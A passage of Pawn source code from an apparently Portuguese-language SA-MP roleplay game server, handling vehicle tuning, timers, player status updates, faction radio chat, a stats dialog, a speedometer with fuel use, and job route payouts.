		    cInfo[vehicleid][mod4] = componentid;
		    AddVehicleComponent(vehicleid, componentid);
		}
	    case 1117,1152,1153,1155,1157,1160,1165,1166,1169..1174,1176,1179,1181,1182,1185,1188..1191: // Front Bumpers
	    {
	        cInfo[vehicleid][mod3] = componentid;
	        AddVehicleComponent(vehicleid, componentid);
	    }
	    case 1018..1022,1028,1029,1034,1037,1043..1046,1059,1064..1066,1089,1092,1104,1105,1113,1114,1126,1127,1129,1132,1135,1136: // Exhaust
	    {
			cInfo[vehicleid][mod2] = componentid;
			AddVehicleComponent(vehicleid, componentid);
	    }
	    case 1000,1001,1002,1003,1014,1015,1016,1023,1049,1050,1058,1060,1138,1139,1146,1147,1158,1162,1163,1164: // Spoiler
	    {
			cInfo[vehicleid][mod6] = componentid;
			AddVehicleComponent(vehicleid, componentid);
	    }
	    case 1010: // Nitro
	    {
			cInfo[vehicleid][mod10] = componentid;
			AddVehicleComponent(vehicleid, componentid);
	    }
	    case 1087: // Hidraulicos
	    {
			cInfo[vehicleid][mod11] = componentid;
			AddVehicleComponent(vehicleid, componentid);
	    }
	    default:
	    {
			new string[128];
			
			format(string, sizeof(string), "[Erro Tunning:] CarID: %d - ComponentID: %d", vehicleid, componentid);
	        ErrorLog(string);
	    }
	}
	GuardarCarro(vehicleid);
	
	return 1;
}

public Relogio()
{
    new Hour, Minute, Second, timestring[32];
    
	gettime(Hour, Minute, Second);
	format(timestring, sizeof(timestring), "%02d:%02d:%02d", Hour, Minute, Second);
	TextDrawSetString(relogio, timestring);
	
	if(HoraAntiga == -1)
	{
	    HoraAntiga = Hour;
	}
	if(HoraAntiga != Hour)
	{
		Euromilhoes();
		
		RespawnCounter = 1;
		TimerRespawn = SetTimer("RespawnGeral", 1000, true);
		
		HoraAntiga = Hour;
	}
	
	MeteoSegundos++;
	
	if(MeteoSegundos == 60)
	{
	    MeteoSegundos = 0;
	    MeteoMinutos++;
	    
	    if(MeteoMinutos == 60)
	    {
	        MeteoMinutos = 0;
	        SetWorldTime(Hour);
	        
        	new rand = random(21);

			Meteo(rand);
	    }
	}
	
	UptimeSegundos++;
	
	if(UptimeSegundos == 60)
	{
	    UptimeSegundos = 0;
	    UptimeMinutos++;
	    
		if(UptimeMinutos == 60)
		{
		    UptimeMinutos = 0;
		    UptimeHoras++;
		}
		
		if(UptimeHoras == 24)
		{
			UptimeHoras = 0;
			UptimeDias++;
		}
	}
	
	return 1;
}

public UpdateJogador(playerid)
{
	Tickbefore_Update[playerid] = GetTickCount();

	new string[128];
	
	new ping = GetPlayerPing(playerid);
	
	new Float:health, Float:armour;
	GetPlayerHealth(playerid, health);
	GetPlayerArmour(playerid, armour);
	
	pInfo[playerid][Vida] = health;
	pInfo[playerid][Colete] = armour;
	
	if(health > 100 && pInfo[playerid][Morto] == 0 && AdminDuty[playerid] == false)
	{
	    SetPlayerHealth(playerid, 50);
		pInfo[playerid][Vida] = 50;
	}
	
	PingTotal += ping;
	PingCount++;
	
	Segundos[playerid]++;

	if(Segundos[playerid] >= 60 && Segundos[playerid] <= 62)
	{
	    sStats[0][MinutesPlayed]++;
	    
		pInfo[playerid][Minutos]++;
		Segundos[playerid] = 0;
		
		if(AdminDuty[playerid] == false)
		{
	        new suid[32];

	        Delete3DTextLabel(UIDLabel[playerid]);
			format(suid, sizeof(suid), "{FF0000}[ {FF9900}%d {FF0000}]", pInfo[playerid][UID]);
			UIDLabel[playerid] = Create3DTextLabel(suid, COLOR_WHITE, 0, 0, 0, 70.0, 0, 1);
			Attach3DTextLabelToPlayer(UIDLabel[playerid], playerid, 0.0, 0.0, 0.5);
		}
		else
		{
		    Delete3DTextLabel(DutyLabel[playerid]);
		    
 			switch(pInfo[playerid][Admin])
			{
			    case 1,2:
				{
	    			DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {E8E541}GameMaster {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);
				}
			    case 3,4:
				{
					DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {E68D45}Administrador {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);
				}
				case 5:
				{
					DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {00FFFB}Head Admin {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);
				}

		        case 6:
				{
	                DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {00FF00}Responsável {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);

				}
		        case 1337:
				{
					DutyLabel[playerid] = Create3DTextLabel("{FF9900}[ {00FF00}Scripter {FF9900}]", COLOR_GM, 0, 0, 0, 40.0, 0, 0);
				}
			}
		}
		
		if(pInfo[playerid][TempoRota] != 0)
		{
		    pInfo[playerid][TempoRota]--;
		    
		    if(pInfo[playerid][TempoRota] == 0)
		    {
		        SendClientMessage(playerid, COLOR_INFO, "[Centro De Emprego:] {FFFFFF}Já podes ir trabalhar.");
		    }
		}
		
 		if(pInfo[playerid][Admin] == 0 && pInfo[playerid][Jailed] == 0 && pInfo[playerid][Preso] == 0)
		{
			if(IsPlayerInRangeOfPoint(playerid, 5.0, AntiAFK_X[playerid], AntiAFK_Y[playerid], AntiAFK_Z[playerid]) && AntiAFK_X[playerid] != 0 && AntiAFK_Y[playerid] != 0)
			{
   				AFKWarning[playerid]++;
       		}
    		else
			{
   				GetPlayerPos(playerid, AntiAFK_X[playerid], AntiAFK_Y[playerid], AntiAFK_Z[playerid]);
			    AFKWarning[playerid] = 0;
			}
		}
		
		if(AFKWarning[playerid] == 5 || AFKWarning[playerid] == 10 || AFKWarning[playerid] > 15)
		{
			foreach(new i : Player)
			{
				// if(!IsPlayerConnected(i)) continue;
				if(AdminDuty[i] == false) continue;

				format(string, sizeof(string), "[ANTI-AFK:] {FFFFFF}O jogador %s (ID:%d) pode estar AFK!", GetPlayerNameEx(playerid), playerid);
				SendClientMessage(i, COLOR_OWNER, string);
			}
		}
		
		if(pInfo[playerid][Viciado] == 1)
		{
		    pInfo[playerid][TempoViciado]++;
		    
		    if(pInfo[playerid][TempoViciado] == 60)
		    {
				SetPlayerHealthEx(playerid, 10, 2);
		    }
		    else if(pInfo[playerid][TempoViciado] == 120)
		    {
				SetPlayerHealthEx(playerid, 30, 2);
		    }
		    else if(pInfo[playerid][TempoViciado] == 180)
		    {
          		SetPlayerHealthEx(playerid, 60, 2);
		    }
		    else
		    {
		        SetPlayerHealthEx(playerid, 80, 2);
			}
  		}

		if(pInfo[playerid][Minutos] == 20 || pInfo[playerid][Minutos] == 40 && pInfo[playerid][Doenca] != 0)
		{
		    switch(pInfo[playerid][Doenca])
		    {
		        case 1: // Gripe
				{
				    SendClientMessage(playerid, COLOR_INFO, "[Doenças:] Tens Gripe. Visita o Hospital o mais rápido possível");
				    PlayerActionMessage(playerid, 15.0, "espirra.");
				    SetPlayerHealthEx(playerid, 15, 2);
				}
				case 2: // Infeção Urinária
				{
				    SendClientMessage(playerid, COLOR_INFO, "[Doenças:] Tens uma Infeção Urinária. Visita o Hospital o mais rápido possível");
					SetPlayerHealthEx(playerid, 15, 2);
				}
				case 3: // Dores de barriga
				{
				    SendClientMessage(playerid, COLOR_INFO, "[Doenças:] Tens Dores de Barriga intensas. Visita o Hospital o mais rápido possível");
				    PlayerActionMessage(playerid, 15.0, "vomita.");
				    ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P",4.1,0,1,1,2000,1);
                    SetPlayerHealthEx(playerid, 5, 2);
				}
				case 4: // Ataques de tosse
				{
				    SendClientMessage(playerid, COLOR_INFO, "[Doenças:] Tens Ataques de Tosse regulares. Visita o Hospital o mais rápido possível");
				    PlayerActionMessage(playerid, 15.0, "começa a tossir.");
					SetPlayerHealthEx(playerid, 10, 2);
				}
		    }
		}
		
		if(pInfo[playerid][Minutos] == 60)
		{
  			pInfo[playerid][Minutos] = 0;
		    Segundos[playerid] = 0;
		    
		    PayDay(playerid);
		}
	}
	
	if(pInfo[playerid][Jailed] == 1)
	{
 		pInfo[playerid][JailTime]--;

		format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~w~Tempo Restante: ~g~%d segundos.", pInfo[playerid][JailTime]);
		GameTextForPlayer(playerid, string, 999, 3);
		
	    if(pInfo[playerid][JailTime] == 0)
	    {
			pInfo[playerid][Jailed] = 0;
			SpawnarJogador(playerid);
	    }
	}
	
	if(pInfo[playerid][Preso] == 1)
	{
	    pInfo[playerid][PresoTempo]--;
	    
		format(string, sizeof(string), "~n~~n~~n~~n~~n~~n~~n~~w~Tempo Restante: ~g~%d segundos.", pInfo[playerid][PresoTempo]);
		GameTextForPlayer(playerid, string, 999, 3);
		
	    if(pInfo[playerid][PresoTempo] == 0)
	    {
			pInfo[playerid][Preso] = 0;
			SpawnarJogador(playerid);
	    }
	}
	
	if(AdminDuty[playerid] == false)
	{
		foreach(new i : Player)
		{
			// if(!IsPlayerConnected(i)) continue;
			if(IsAmigo(playerid, i) == 1 || AdminDuty[i] == true)
			{
			    ShowPlayerNameTagForPlayer(playerid, i, true);
			}
			else
			{
			    ShowPlayerNameTagForPlayer(playerid, i, false);
			}
		}
	}
	else
	{
		foreach(new i : Player)
		{
			// if(!IsPlayerConnected(i)) continue;
			ShowPlayerNameTagForPlayer(playerid, i, true);
		}
	}
	
	Tickafter_Update[playerid] = GetTickCount();
	
	if(Tickbefore_Update[playerid] <= Tickafter_Update[playerid])
	{
		TickTotal_Update += Tickafter_Update[playerid]-Tickbefore_Update[playerid];
		TickCount_Update++;

		if(DebugStatusAdv[playerid] == true)
		{
			new stringcmd[128];

			format(stringcmd, sizeof(stringcmd), "[DEBUG AVANÇADO:] {FFFFFF}UpdateJogador executado em %d ms", floatround(Tickafter_Update[playerid]-Tickbefore_Update[playerid], floatround_round));
			SendClientMessage(playerid, COLOR_RED, stringcmd);
		}
	}

	return 1;
}

public DrugEffect(playerid)
{
	if(DrugEffectCounter[playerid] == 0)
	{
		SetPlayerDrunkLevel(playerid, 50000);
	}
	
	new rand = random(46);
	
	SetPlayerWeather(playerid, rand);
	
	DrugEffectCounter[playerid]++;
	
	if(DrugEffectCounter[playerid] == 1000) // ~2 minutos
	{
	    DrugEffectCounter[playerid] = 0;
	    SetPlayerDrunkLevel(playerid, 0);

	    KillTimer(TimerDroga[playerid]);
	}
	
	return 1;
}

public VirarAmigo(playerid, giveplayerid)
{
	new entry[256],File:hFile, string[128];

	format(string, sizeof(string), "PCRP/Amigos/%s.ini", GetName(playerid));
	format(entry, sizeof(entry), "%s\r\n", GetName(giveplayerid));
	
	hFile = fopen(string, io_append);
	fwrite(hFile, entry);
	fclose(hFile);
}

public RadioMessageOOC(playerid, faction, msg[])
{
	new string[128];
	
	SetTimerEx("AcabarMsg", 1000, false, "i", playerid);

	foreach(new i : Player)
	{
	    // if(!IsPlayerConnected(i)) continue;
	    if(pInfo[i][Faction] == 0) continue;
	    if(fInfo[pInfo[i][Faction]][Legal] == 0) continue;
	    if(pInfo[playerid][Faction] != pInfo[i][Faction]) continue;

		format(string, sizeof(string), "[F-OOC] %s %s: %s", GetRankName(pInfo[playerid][Faction], pInfo[playerid][FactionRank]), GetPlayerNameEx(playerid), msg);

        SendClientMessage(i, 0x3399ffAA, string);
	}
	return 1;
}

public RadioMessage(playerid, faction, msg[])
{
	new string[128];

	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
	SetTimerEx("AcabarMsg", 1000, false, "i", playerid);

	foreach(new i : Player)
	{
	    // if(!IsPlayerConnected(i)) continue;
	    if(pInfo[i][Faction] == 0) continue;
	    if(fInfo[pInfo[i][Faction]][Legal] == 0) continue;
	    if(pInfo[playerid][Faction] != pInfo[i][Faction]) continue;

		format(string, sizeof(string), "[Rádio] %s %s: %s", GetRankName(pInfo[playerid][Faction], pInfo[playerid][FactionRank]), GetPlayerNameEx(playerid), msg);

		switch(fInfo[pInfo[playerid][Faction]][Type])
		{
		    case F_POLICIA:
		    {
		        SendClientMessage(i, 0x0000BBAA, string);
		    }
		    case F_MEDICOS:
		    {
		        SendClientMessage(i, 0xFF66FFAA, string);
		    }
		    case F_MECANICOS:
		    {
		        SendClientMessage(i, 0xEEEEFFC4, string);
		    }
		    case F_NEWS:
		    {
		        SendClientMessage(i, 0x4B00B0AA, string);
		    }
 		    case F_GOVERNO:
		    {
                SendClientMessage(i, 0x660000AA, string);
		    }
		}
	}
	return 1;
}

public RadioMessageGlobal(playerid, faction, msg[])
{
	new string[128];
	
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
	SetTimerEx("AcabarMsg", 1000, false, "i", playerid);
	
	foreach(new i : Player)
	{
	    // if(!IsPlayerConnected(i)) continue;
	    if(pInfo[i][Faction] == 0) continue;
	    if(fInfo[pInfo[i][Faction]][Legal] == 0) continue;
	    
		format(string, sizeof(string), "[%s] %s %s: %s", fInfo[pInfo[playerid][Faction]][Nome], GetRankName(pInfo[playerid][Faction], pInfo[playerid][FactionRank]), GetPlayerNameEx(playerid), msg);
		
		switch(fInfo[pInfo[playerid][Faction]][Type])
		{
		    case F_POLICIA:
		    {
		        SendClientMessage(i, 0x0000BBAA, string);
		    }
		    case F_MEDICOS:
		    {
		        SendClientMessage(i, 0xFF66FFAA, string);
		    }
		    case F_MECANICOS:
		    {
		        SendClientMessage(i, 0xEEEEFFC4, string);
		    }
		    case F_NEWS:
		    {
		        SendClientMessage(i, 0x4B00B0AA, string);
		    }
 		    case F_GOVERNO:
		    {
                SendClientMessage(i, 0x660000AA, string);
		    }
		}
	}
	
	return 1;
}

forward AcabarMsg(playerid);
public AcabarMsg(playerid)
{
	SetPlayerSpecialAction(playerid, 0);
	
	return 1;
}

public HangupTimer(playerid)
{
	if(!IsPlayerInAnyVehicle(playerid))
	{
		if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USECELLPHONE)
		{
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			
			return 1;
		}
	}
	
	return 0;
}

public WalkieTalkieMessage(playerid, msg[], freq)
{
	new name[64], string[128];

	if(!IsPlayerInAnyVehicle(playerid))
	{
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
		SetTimerEx("HangupTimer", 1000, false, "i", playerid);
	}

	foreach(new i : Player)
	{
	    if(pObjects[i][WalkieTalkie] == 0) continue;
	    if(pObjects[i][WalkieTalkieFreq] != freq) continue;
	    if(playerid == i) continue;

		if(IsAmigo(i, playerid) == 1 || pInfo[playerid][Admin] > 0)
		{
			format(name, sizeof(name), "%s", GetPlayerNameEx(playerid));
		}
		else
		{
			format(name, sizeof(name), "Desconhecido (UID: %d)", pInfo[playerid][UID]);
		}
		
		format(string, sizeof(string), "[WT:] %s: {04A7DE}%s.", name, msg);

		SendClientMessage(i, 0x1888ADAA, string);
	}
	
	return 1;
}

public ShowStats(playerid, target, admincheck)
{
	new sdialog[3000];
	new string[700];
	new telemovel[10];
	new ligeiros[4];
	new pesados[4];
	new mota[4];
	new barco[4];
	new armas[4];
	new staff[4];
	new rank[16];
	new faction[32];
	new factionrank[32];
	
	switch(pInfo[target][Admin])
	{
	    case 0:
	    {
			staff = "Não";
			rank = "Nenhum";
	    }
	    case 1,2:
	    {
			staff = "Sim";
			rank = "GameMaster";
	    }
	    case 3,4:
	    {
			staff = "Sim";
			rank = "Administrador";
	    }
	    case 5:
	    {
			staff = "Sim";
			rank = "Head Admin";
	    }
	    case 6:
	    {
			staff = "Sim";
			rank = "Responsável";
	    }
	    case 1337:
	    {
			staff = "Sim";
			rank = "Scripter";
	    }
	}
	
	if(pInfo[target][Faction] == 0)
	{
	    faction = "Nenhuma";
	    factionrank = "Nenhum";
	}
	else
	{
	    factionrank = GetRankName(pInfo[target][Faction], pInfo[target][FactionRank]);
	}
	
	if(pInfo[target][CartaLig] == 1)
	{
	    ligeiros = "Sim";
	}
	else
	{
	    ligeiros = "Não";
	}
	
	if(pInfo[target][CartaPesados] == 1)
	{
	    pesados = "Sim";
	}
	else
	{
	    pesados = "Não";
	}
	
	if(pInfo[target][CartaMota] == 1)
	{
	    mota = "Sim";
	}
	else
	{
	    mota = "Não";
	}

	if(pInfo[target][LicArmas] == 1)
	{
	    armas = "Sim";
	}
	else
	{
	    armas = "Não";
	}
	
	if(pInfo[target][CartaBarco] == 1)
	{
	    barco = "Sim";
	}
	else
	{
	    barco = "Não";
	}
	
	if(pObjects[target][Telemovel] == 0)
 	{
 		telemovel = "Não tem";
 	}
	else
	{
		format(telemovel, sizeof(telemovel), "%d", pInfo[playerid][NumeroTelemovel]);
	}
	
	format(string, sizeof(string), "{487349}[GERAL:] {75BF76}Nome: {FFFFFF}%s - {75BF76}Nível: {FFFFFF}%d - {75BF76}Idade: {FFFFFF}%d - {75BF76}Meses: {FFFFFF}%d - {75BF76}Experiência: {FFFFFF}%d - {75BF76}Multas: {FFFFFF}%d", GetPlayerNameEx(target), pInfo[target][Level], pInfo[target][Idade], pInfo[target][Meses], pInfo[target][XP], pInfo[target][Multas]); strcat(sdialog,string);
    format(string, sizeof(string), "\n\n{487349}[GERAL:] {75BF76}Banco: {FFFFFF}%d$ - {75BF76}Pré-Drogas: {FFFFFF}%d - {75BF76}Pré-Materiais: {FFFFFF}%d - {75BF76}Drogas: {FFFFFF}%d - {75BF76}Materiais: {FFFFFF}%d - {75BF76}Telemóvel: {FFFFFF}%s", pInfo[target][Bank], pInfo[target][PreDrogas], pInfo[target][PreMateriais], pInfo[target][Drogas], pInfo[target][Materiais], telemovel); strcat(sdialog,string);
	format(string, sizeof(string), "\n\n{487349}[LICENÇAS:] {75BF76}Ligeiros: {FFFFFF}%s - {75BF76}Motociclos: {FFFFFF}%s - {75BF76}Pesados: {FFFFFF}%s - {75BF76}Barco: {FFFFFF}%s - {75BF76}Armas: {FFFFFF}%s", ligeiros, mota, pesados, barco, armas); strcat(sdialog,string);
	format(string, sizeof(string), "\n\n{487349}[CHAVES:] {75BF76}Chave de Casa: {FFFFFF}%d - {75BF76}Chave da Loja: {FFFFFF}%d - {75BF76}Chave da Casa Alugada: {FFFFFF}%d - {75BF76}UID: {FFFFFF}%d", pInfo[target][ChaveCasa], pInfo[target][ChaveBiz], pInfo[target][ChaveCasaAlugada], pInfo[target][UID]); strcat(sdialog,string);
	format(string, sizeof(string), "\n\n{487349}[VEÍCULOS:] {75BF76}1ª Chave: {FFFFFF}%d - {75BF76}2ª Chave: {FFFFFF}%d - {75BF76}3ª Chave: {FFFFFF}%d - {75BF76}4ª Chave: {FFFFFF}%d", pInfo[target][ChaveCarro1], pInfo[target][ChaveCarro2], pInfo[target][ChaveCarro3], pInfo[target][ChaveCarro4]); strcat(sdialog,string);
	format(string, sizeof(string), "\n\n{487349}[EMPRESTADOS:] {75BF76}5ª Chave: {FFFFFF}%d - {75BF76}6ª Chave: {FFFFFF}%d - {75BF76}7ª Chave: {FFFFFF}%d - {75BF76}8ª Chave: {FFFFFF}%d", pInfo[target][ChaveCarroEmp1], pInfo[target][ChaveCarroEmp2], pInfo[target][ChaveCarroEmp3], pInfo[target][ChaveCarroEmp4]); strcat(sdialog,string);
    format(string, sizeof(string), "\n\n{487349}[PESCA:] {75BF76}Isco: {FFFFFF}%d - {75BF76}Corvinas: {FFFFFF}%d - {75BF76}Congros: {FFFFFF}%d - {75BF76}Robalos: {FFFFFF}%d - {75BF76}Sargos: {FFFFFF}%d", pObjects[playerid][Isco], pObjects[playerid][Peixe_Corvina], pObjects[playerid][Peixe_Congro], pObjects[playerid][Peixe_Robalo], pObjects[playerid][Peixe_Sargo]); strcat(sdialog,string);
    format(string, sizeof(string), "\n\n{487349}[PESCA:] {75BF76}Gorazes: {FFFFFF}%d - {75BF76}Cavalas: {FFFFFF}%d - {75BF76}Douradas: {FFFFFF}%d - {75BF76}Peixes Espada: {FFFFFF}%d", pObjects[playerid][Peixe_Goraz], pObjects[playerid][Peixe_Cavala], pObjects[playerid][Peixe_Dourada], pObjects[playerid][Peixe_Espada]); strcat(sdialog,string);
	format(string, sizeof(string), "\n\n{487349}[OOC:] {75BF76}Staff: {FFFFFF}%s - {75BF76}Rank: {FFFFFF}%s - {75BF76}Faction: {FFFFFF}%s - {75BF76}Rank: {FFFFFF}%s - {75BF76}Admin Jails: {FFFFFF}%d - {75BF76}Golds: {FFFFFF}%d", staff, rank, fInfo[pInfo[playerid][Faction]][Nome], factionrank, pInfo[target][AJCounter], pInfo[target][Golds]); strcat(sdialog,string);

	if(admincheck == 1)
	{
 		new Float:health;
    	GetPlayerHealth(target, health);
    	
        format(string, sizeof(string), "\n\n{487349}[ADMIN INFO:] {75BF76}Vezes erradas no questionário: {FFFFFF}%d {FFFFFF} - {75BF76}Minutos: {FFFFFF}%d {FFFFFF} - {75BF76}VidaVar: {FFFFFF}%f {FFFFFF} - {75BF76}Vida: {FFFFFF}%f", pInfo[target][TutFalhado], pInfo[target][Minutos], pInfo[target][Vida], health); strcat(sdialog,string);
	}

	ShowPlayerDialog(playerid, DIALOG_ESTATISTICAS, DIALOG_STYLE_MSGBOX,"{FF8000}ESTATÍSTICAS:", sdialog, "Ok", "");
		
	return 1;
}

public Velocimetro(playerid)
{
	new Float:speed = GetPlayerSpeed(playerid);
	new velocidadeinicial = floatround(speed);
	new vel[4];
	new consumostr[4];
	new car = GetPlayerVehicleID(playerid);
	new gasolina[8];
 	new Float:health;
 	
    GetVehicleHealth(car, health);
    cInfo[car][Vida] = health;
	
	format(vel, sizeof(vel), "%d", velocidadeinicial);
	
	if(Motor[car] == true)
	{
		if(velocidadeinicial == 0) { format(consumostr, sizeof(consumostr), "0.5"); CounterVelocimetro[playerid] += 1; }
		else if(velocidadeinicial >= 1 && velocidadeinicial < 49) { format(consumostr, sizeof(consumostr), "1"); CounterVelocimetro[playerid] += 1; CounterKilometros[playerid] += 1; }
		else if(velocidadeinicial >= 49 && velocidadeinicial < 99) { format(consumostr, sizeof(consumostr), "1.5"); CounterVelocimetro[playerid] += 2; CounterKilometros[playerid] += 2; }
		else if(velocidadeinicial >= 99 && velocidadeinicial < 129) { format(consumostr, sizeof(consumostr), "2"); CounterVelocimetro[playerid] += 3; CounterKilometros[playerid] += 3; }
		else if(velocidadeinicial >= 129 && velocidadeinicial < 199) { format(consumostr, sizeof(consumostr), "2.5"); CounterVelocimetro[playerid] += 4; CounterKilometros[playerid] += 4; }
		else if(velocidadeinicial >= 199) { format(consumostr, sizeof(consumostr), "3"); CounterVelocimetro[playerid] += 6; CounterKilometros[playerid] += 5;}
		
		if(velocidadeinicial > 0)
		{
			new pneus = random(250000);

			if(pneus == 1) // furou os pneus
			{
				new rand = random(10);
				
				switch(rand)
				{
					case 0: { cInfo[car][Tires] = 0001; }
					case 1: { cInfo[car][Tires] = 0011; }
					case 2: { cInfo[car][Tires] = 0111; }
					case 3: { cInfo[car][Tires] = 1111; }
					case 4: { cInfo[car][Tires] = 1000; }
					case 5: { cInfo[car][Tires] = 1100; }
					case 6: { cInfo[car][Tires] = 1110; }
					case 7: { cInfo[car][Tires] = 1001; }
					case 8: { cInfo[car][Tires] = 1010; }
					case 9: { cInfo[car][Tires] = 1101; }
					default: { cInfo[car][Tires] = 1111; }
				}
				
				PlayerActionMessage(playerid, 15.0, "ouve um estrondo e sente o carro a fugir.");
				
				UpdateVehicleDamageStatus(cInfo[car][ID], cInfo[car][Panels], cInfo[car][Doors], cInfo[car][Lights], cInfo[car][Tires]);
			}
		}
		
		if(CounterKilometros[playerid] >= 150)
		{
	 		cInfo[car][Kilometros]++;
	 		CounterKilometros[playerid] = 0;
		}

		if(CounterVelocimetro[playerid] >= 400)
		{
		    cInfo[car][Gasolina]--;
	        CounterVelocimetro[playerid] = 0;
		}

		if(cInfo[car][Gasolina] == 0)
		{
		    new engine, lights, alarm, doors, bonnet, boot, objective;

			GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(car, 0,lights,alarm,doors,bonnet,boot,objective);
			Motor[car] = false;

		    PlayerActionMessage(playerid, 15.0, "repara que ficou sem gasolina.");
		}

	  	if(health < 300)
	  	{
	  	    SetVehicleHealth(car, 300);
	  	    cInfo[car][Vida] = 300;

	   		new engine, lights, alarm, doors, bonnet, boot, objective;

			GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(car, 0,lights,alarm,doors,bonnet,boot,objective);
			Motor[car] = false;
			PlayerActionMessage(playerid, 15.0, "deixa o carro ir abaixo.");
	  	}

	  	if(300 <= health <= 450)
	  	{
	  	    new rand = random(20);

			if(rand == 1)
			{
		   		new engine, lights, alarm, doors, bonnet, boot, objective;

				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car, 0,lights,alarm,doors,bonnet,boot,objective);
				
				Motor[car] = false;
				PlayerActionMessage(playerid, 15.0, "deixa o carro ir abaixo.");
			}
	  	}
	}
	else
	{
	    format(consumostr, sizeof(consumostr), "0");
	}
	
	PlayerTextDrawSetString(playerid, TDEditor_PTD[playerid][0], vel);

	format(gasolina, sizeof(gasolina), "%d", cInfo[car][Gasolina]);
	PlayerTextDrawSetString(playerid, TDEditor_PTD[playerid][1], gasolina);
	format(gasolina, sizeof(gasolina), "%d", cInfo[car][Kilometros]);
	PlayerTextDrawSetString(playerid, TDEditor_PTD[playerid][2], gasolina);
	PlayerTextDrawSetString(playerid, TDEditor_PTD[playerid][4], consumostr);

	return 1;
}

public AtualizarTunning(vehicleid)
{
	if(cInfo[vehicleid][mod1] != -1)
    {
        ChangeVehiclePaintjob(vehicleid, cInfo[vehicleid][mod1]);
    }
    if(cInfo[vehicleid][mod2] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod2]);
    }
    if(cInfo[vehicleid][mod3] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod3]);
    }
    if(cInfo[vehicleid][mod4] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod4]);
    }
    if(cInfo[vehicleid][mod5] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod5]);
    }
    if(cInfo[vehicleid][mod6] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod6]);
    }
    if(cInfo[vehicleid][mod7] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod7]);
    }
    if(cInfo[vehicleid][mod8] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod8]);
    }
    if(cInfo[vehicleid][mod9] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod9]);
    }
    if(cInfo[vehicleid][mod10] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod10]);
    }
    if(cInfo[vehicleid][mod11] != 0)
    {
        AddVehicleComponent(vehicleid, cInfo[vehicleid][mod11]);
    }
    
    return 1;
}

public AcabarRota(playerid)
{
	pInfo[playerid][Rotas]++;

	switch(pInfo[playerid][EmpregoNivel])
	{
	    case 1:
	    {
	        if(pInfo[playerid][Rotas] >= 10)
	        {
	            pInfo[playerid][Rotas] = 0;
	            pInfo[playerid][EmpregoNivel]++;
	        }
	    }
	    case 2:
	    {
	        if(pInfo[playerid][Rotas] >= 20)
	        {
	            pInfo[playerid][Rotas] = 0;
	            pInfo[playerid][EmpregoNivel]++;
	        }
	    }
 	    case 3:
	    {
	        if(pInfo[playerid][Rotas] >= 30)
	        {
	            pInfo[playerid][Rotas] = 0;
	            pInfo[playerid][EmpregoNivel]++;
	        }
	    }
 	    case 4:
	    {
	        if(pInfo[playerid][Rotas] >= 40)
	        {
	            pInfo[playerid][Rotas] = 0;
	            pInfo[playerid][EmpregoNivel]++;
	        }
		}
 	    case 5:
	    {
	        if(pInfo[playerid][Rotas] >= 50)
	        {
	            pInfo[playerid][Rotas] = 0;
	            pInfo[playerid][EmpregoNivel]++;
	        }
	    }
	}
	
	new car = GetPlayerVehicleID(playerid);
	
	switch(pInfo[playerid][Emprego])
	{
	    case 7,8:
	    {
			if(!IsTrailerAttachedToVehicle(car))
			{
			    SendClientMessage(playerid, COLOR_CHAT, "[CENTRO DE EMPREGO:] {FFFFFF}Não trouxeste o reboque porquê? Não recebeste salário por causa disso!");
			    pInfo[playerid][TempoRota] = 6*pInfo[playerid][EmpregoNivel];
			    
                RepairVehicle(car);
                cInfo[car][Vida] = 1000;
				SetVehicleToRespawn(car);
				AtualizarDanosCarro(car);
				cInfo[car][Gasolina] = 100;
				
				sStats[0][Rotas]++;
				
				return 1;
			}
			else
			{
			    new trailerid = GetVehicleTrailer(car);
			    SetVehicleToRespawn(trailerid);
			}
	    }
	}
	
	new salario, string[128];
	
	RepairVehicle(car);
	cInfo[car][Vida] = 1000;
	SetVehicleToRespawn(car);
	AtualizarDanosCarro(car);
	cInfo[car][Gasolina] = 100;
	
	pInfo[playerid][TempoRota] = 6*pInfo[playerid][EmpregoNivel];
	salario = pInfo[playerid][EmpregoNivel]*jInfo[pInfo[playerid][Emprego]][RotaSalario];
	
	format(string, sizeof(string), "[CENTRO DE EMPREGO:] {FFFFFF}Acabaste a tua rota. Recebeste %d$.", salario);
	SendClientMessage(playerid, COLOR_CHAT, string);
	
	GivePlayerMoneyEx(playerid, salario);
	
	sStats[0][Rotas]++;
	
	return 1;
}

public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
    if(IsARespawn[vehicleid] == false)
    {
	    new panels, doors, lights, tires;
	    GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);

		cInfo[vehicleid][Panels] = panels;
		cInfo[vehicleid][Doors] = doors;
		cInfo[vehicleid][Lights] = lights;
		cInfo[vehicleid][Tires] = tires;
		
